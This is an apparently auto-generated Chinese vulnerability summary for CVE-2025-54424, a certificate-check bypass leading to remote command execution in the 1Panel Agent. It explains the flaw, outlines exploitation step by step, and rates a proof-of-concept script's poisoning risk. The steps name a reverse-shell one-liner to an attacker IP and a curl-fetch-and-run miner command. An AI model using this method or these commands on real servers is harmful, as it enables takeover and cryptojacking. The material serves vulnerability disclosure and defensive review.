## CVE-2025-54424 - 1Panel 证书验证绕过, 远程命令执行 (RCE)

**漏洞编号:** CVE-2025-54424

**漏洞类型:** 证书验证绕过, 远程命令执行 (RCE)

**影响应用:** 1Panel

**危害等级:** 高危

**CVSS评分:** 未提供

**影响版本:** 1Panel ≤ v2.0.5

**利用条件:** 网络可达, 无需认证(通过伪造证书绕过), 需要构造特制证书

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-54424 揭示了 1Panel Agent 中存在的严重远程命令执行（RCE）漏洞，其根源在于 TLS 证书验证逻辑的缺陷。1Panel 作为一款开源的 Linux 服务器运维管理面板，其 v2 版本引入的 Core-Agent 架构通过 HTTPS 进行主节点与从节点之间的通信。此漏洞的关键在于，Agent 在进行客户端证书校验时使用了 `tls.RequireAnyClientCert` 配置，并且仅检查了证书的 Common Name (CN) 是否为“panel_client”，而没有对证书的颁发者、有效期或其他更严格的属性进行验证。这种宽松的验证机制使得攻击者能够通过伪造一个 CN 为“panel_client”的自签名证书，轻松绕过 Agent 的身份验证机制，从而建立未经授权的连接。一旦连接建立，攻击者便可以通过 WebSocket 通道向 Agent 发送任意指令，这些指令将在目标服务器上以 Agent 的权限执行，最终导致完全的系统控制。该漏洞影响 1Panel v2.0.5 及更早版本，具有极高的威胁等级。

提供的 POC 代码 `CVE-2025-54424.py` 充分利用了这一缺陷，展现了完整的远程代码执行能力。该脚本的实现非常专业和高效。它首先利用 `cryptography` 库动态生成一个 CN 设为“panel_client”的自签名 X.509 证书和对应的 RSA 私钥，并将其存储在安全的临时文件中。这种动态生成机制确保了 POC 的灵活性和独立性。随后，它通过 `requests` 库对目标 Agent 的 `/api/v2/dashboard/base/os` 接口进行 HTTPS 预检，尝试使用伪造的证书进行认证。这一步骤旨在验证 Agent 是否会接受此伪造证书。一旦预检成功，表明证书绕过机制有效，脚本便会利用 `websocket` 库建立一个基于 TLS 的 WebSocket 连接。通过这个已认证的 WebSocket 通道，攻击者可以向 Agent 发送任意命令，这些命令将在目标服务器上以 Agent 的权限执行。POC 代码结构清晰，使用 `argparse` 进行参数解析，支持单个目标或目标列表的批量处理，并能够配置代理，显示了其高度的可用性和可靠性。代码中的 `check_target` 函数负责证书校验绕过的验证，而 `exploit_target` 函数则负责实际的命令执行，逻辑分离，易于理解和复现。此外，脚本还包含了完善的错误处理和日志输出机制，有助于用户理解执行过程和调试问题。因此，该 POC 被评为高质量的完整利用工具，能够稳定复现并利用该漏洞，对受影响系统构成即时和严重的威胁。

**利用步骤：**
1.  **目标识别：** 攻击者首先需要通过各种手段识别运行 1Panel Agent 且版本受影响（具体为 1Panel ≤ v2.0.5）的服务器实例。
2.  **证书伪造：** 自动化 POC 脚本会动态调用 Python 的 `cryptography` 库，生成一个自签名的 TLS 客户端证书和对应的私钥。此证书的关键特征是其 Common Name (CN) 被精确设置为“panel_client”。这是绕过 1Panel Agent 仅进行 CN 检查的验证逻辑的关键一步。
3.  **TLS 连接建立与验证：** 攻击者使用伪造的证书尝试与目标 1Panel Agent 建立安全的 HTTPS 连接（通过 `/api/v2/dashboard/base/os` 接口进行初步验证）。由于 Agent 的证书验证逻辑缺陷（`tls.RequireAnyClientCert` 和仅 CN 检查），即使是自签名的、未经授权的证书，只要 CN 正确，也会被 Agent 接受，从而成功建立 TLS 连接。
4.  **WebSocket 通信：** 在成功的 TLS 连接之上，POC 脚本会进一步建立一个 WebSocket 连接。这个 WebSocket 连接承载了后续的命令控制流量。
5.  **远程命令执行：** 通过已建立的 WebSocket 连接，攻击者可以向 1Panel Agent 发送精心构造的 JSON 格式消息，其中包含需要执行的任意系统命令。Agent 会将这些消息解析为命令并执行，例如 `bash -i >& /dev/tcp/attacker_ip/port 0>&1` 以获取反弹 Shell，或者 `curl -o /tmp/miner ... | sh` 植入挖矿程序，最终实现对目标服务器的完全控制和持续驻留。

**投毒风险分析：** 对提供的 `CVE-2025-54424.py` POC 代码进行了细致入微的审查，旨在评估其潜在的投毒风险。该脚本完全依赖于 Python 官方及社区广泛认可的标准库，包括 `requests` 用于 HTTP 通信、`websocket` 用于建立 WebSocket 连接、`cryptography` 用于加密操作（特别是证书生成）、`tempfile` 用于安全地创建和管理临时文件、`os` 用于与操作系统进行基本的交互、`argparse` 用于提供友好的命令行接口、`threading` 用于实现并发处理以及 `json` 和 `datetime` 用于数据处理。所有这些库都是 Python 生态系统中透明且经过充分审计的合法工具，其行为是可预测和可控的。脚本的核心功能完全围绕着利用 1Panel Agent 的证书验证绕过漏洞展开：其唯一目的在于生成一个具有特定 CN 值的客户端证书，然后利用该证书与目标 Agent 建立连接并执行用户明确指定的系统命令。在代码中，没有发现任何形式的代码混淆、加密指令、或者其他试图隐藏其真实意图的行为，代码逻辑清晰可读。脚本并未包含任何未经授权的外部网络请求；除了连接到用户指定的目标 1Panel Agent 服务外，没有尝试与任何其他第三方服务器进行通信，例如数据泄露服务器、C2 服务器或恶意软件分发点。此外，该脚本没有试图在本地系统上执行未经声明的文件操作（例如安装额外的恶意软件、修改关键系统配置、植入持久化机制或删除重要文件），除了创建和清理用于证书和私钥的临时文件，这些操作都是与漏洞利用过程直接相关且必要的。用户通过命令行参数提供的 `exploit_command` 是漏洞利用的载体，其恶意性由用户控制，这属于漏洞利用本身的功能，不应被错误地解读为 POC 代码的“投毒”行为。例如，如果用户输入了一个获取反弹 Shell 的命令，那么实际的“恶意”行为是由这个用户命令触发的，而不是 POC 脚本自身预设的恶意逻辑。因此，基于对源代码的全面分析，该 POC 脚本被评估为投毒风险极低（0-29%）。尽管如此，作为网络安全领域的最佳实践，任何从非官方或非可信来源获取的 POC 代码，即便表面上看起来无害，也应在隔离环境中进行独立的代码审查和沙盒测试，并监控其网络行为和文件系统活动，以防范潜在的未知风险和零日投毒攻击。防御性安全研究人员在使用此类工具时务必保持高度警惕。

**项目地址:** 未提供

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-54424
